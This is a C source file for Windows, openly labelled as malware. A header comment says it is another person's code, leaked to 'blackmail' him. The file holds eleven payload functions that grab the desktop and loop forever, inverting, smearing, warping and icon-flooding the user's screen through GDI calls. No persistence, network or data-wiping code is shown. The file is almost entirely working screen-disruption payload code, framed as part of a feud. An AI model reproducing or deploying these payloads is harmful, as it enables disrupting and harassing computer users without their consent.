/*
Again this malware was skidded by Clxcq, I just want to blackmail him by open source his malware Qwarpt.
FML
His code was junk as fuck, this is clean that how that random drawing works.
*/

#define _USE_MATH_DEFINES
#include <windows.h>
#include <math.h>

DWORD WINAPI Payload_1()
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        BitBlt(hdc, rand() % w, 1, w, h, hdc, rand() % w, 0, SRCCOPY);
        BitBlt(hdc, rand() % w, -1, -w, h, hdc, rand() % w, 0, SRCCOPY);
        BitBlt(hdc, 1, rand() % h, w, h, hdc, 0, rand() % h, SRCCOPY);
        BitBlt(hdc, -1, rand() % h, -w, h, hdc, 0, rand() % h, SRCCOPY);
    }
}

DWORD WINAPI Payload_2()
{
    HDC hdc = GetDC(GetDesktopWindow());
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    SelectObject(hdc, brush);

    while (1)
    {
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        Sleep(20);
    }
}

DWORD WINAPI Payload_3()
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        for (int t = 0; t < w + h; t++)
        {
            int x = abs(10 + t * tan(t + 30) + rand() % w),
                y = abs(10 + t * cos(t + 30) + rand() % h);

            switch (rand() % 5)
            {
                case 0:
                    DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
                break;

                case 1:
                    DrawIcon(hdc, x, y, LoadIcon(0, IDI_WARNING));
                break;

                case 2:
                    DrawIcon(hdc, x, y, LoadIcon(0, IDI_INFORMATION));
                break;

                case 3:
                    DrawIcon(hdc, x, y, LoadIcon(0, IDI_QUESTION));
                break;

                case 4:
                    DrawIcon(hdc, x, y, LoadIcon(0, IDI_ASTERISK));
                break;    
            }

            InvalidateRect(0, 0, 0);
        }
    }
}

DWORD WINAPI Payload_4()
{
    HDC hdc = GetDC(GetDesktopWindow());
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    while (1)
    {
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATCOPY);
        Sleep(10);
    }
}

DWORD WINAPI Payload_5()
{
    HDC hdc = GetDC(GetDesktopWindow());
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        int a = rand() % w, b = rand() % h;
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w + cos(rand() % 21 - 10), rand() % h + cos(rand() % 21 - 10), SRCAND);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w + cos(rand() % 21 - 10), rand() % h + cos(rand() % 21 - 10), SRCCOPY);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w + tan(rand() % 21 - 10), rand() % h + tan(rand() % 21 - 10), SRCCOPY);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w + sin(rand() % 21 - 10), rand() % h + cos(rand() % 21 - 10), SRCCOPY);
        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w + tan(rand() % 21 - 10), rand() % h + cos(rand() % 21 - 10), SRCCOPY);
    }
}

DWORD WINAPI Payload_6()
{
    HDC hdc = GetDC(GetDesktopWindow());
    HWND hwnd = GetDesktopWindow();
    RECT rect;
    POINT pt[3];
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    GetWindowRect(hwnd, &rect);
    SelectObject(hdc, brush);

    while (1)
    {
        int i = 60; i++;
        pt[0].x = rect.left + i;
        pt[0].y = rect.top - i;
        pt[1].x = rect.right + i;
        pt[1].y = rect.top + i;
        pt[2].x = rect.left - i;
        pt[2].y = rect.bottom - i;

        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);

        StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 16, 16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
        
        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        
        StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 16, 16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);

        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        
        StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 16, 16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);

        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);

        StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 16, 16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
    }
}

DWORD WINAPI Payload_7()
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        BitBlt(hdc, rand() % w, 3, rand() % h, h, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, rand() % w, -2, -rand() % h, w, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, 3, rand() % h, rand() % w, w, hdc, 0, w, SRCCOPY);
        BitBlt(hdc, -6, rand() % h, -rand() % w, w, hdc, 0, h, SRCCOPY);
    }
}

DWORD WINAPI Payload_8() // halalest payload lmfao
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        BitBlt(hdc, w, 3, h, h, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, w, -2, -h, w, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, 3, h, h, w, hdc, 0, w, SRCCOPY);
        BitBlt(hdc, -6, w, -h, h, hdc, 0, h, SRCCOPY);
        BitBlt(hdc, w, 3, h, w, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, w, -2, -h, w, hdc, h, 0, SRCCOPY);
        BitBlt(hdc, 3, h, h, w, hdc, 0, w, SRCCOPY);
        BitBlt(hdc, -6, w, -h, w, hdc, 0, h, SRCCOPY);
        BitBlt(hdc, w, 1, w, h, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, w, -1, -w, h, hdc, w, 0, SRCCOPY);
        BitBlt(hdc, 1, h, w, h, hdc, 0, h, SRCCOPY);
        BitBlt(hdc, -1, h, -w, h, hdc, 0, h, SRCCOPY);
    }
}

DWORD WINAPI Payload_9()
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
    {
        switch (rand() % 2)
        {
            case 0:
                BitBlt(hdc, 1, rand() % w, h, 15, hdc, 0, rand() % w, SRCCOPY);
            break;

            case 1:
                BitBlt(hdc, 0, rand() % w, h, 15, hdc, 1, rand() % w, SRCCOPY);
            break;
        }
    }
}

DWORD WINAPI Payload_10()
{
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        StretchBlt(hdc, 30, 30, w - 0, h - 0, hdc, w, h, -w, -h, SRCCOPY);
        Sleep(50);
    }
}

DWORD WINAPI Payload_11()
{
    HDC hdc = GetDC(GetDesktopWindow());
    HDC hdcMem = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
   
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // is he understand why should allocate memory?
    HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
    SelectObject(hdcMem, hbm);

    for (int i = 0;; i++, i %= 6)
    {
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); 
        GetBitmapBits(hbm, w * h * 4, data);

        for (int i = 0; w * h > i; i++)
        {
            int x = i * w + i, y = i * h + i, f = (y | x + y + -1 + x + w / h);
            ((BYTE*)(data + i))[9] = (f / 1);
        }
        SetBitmapBits(hbm, w * h * 4, data); 
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        Sleep(80);
    }
}

// Not going to add his shit payloads it's enough for now.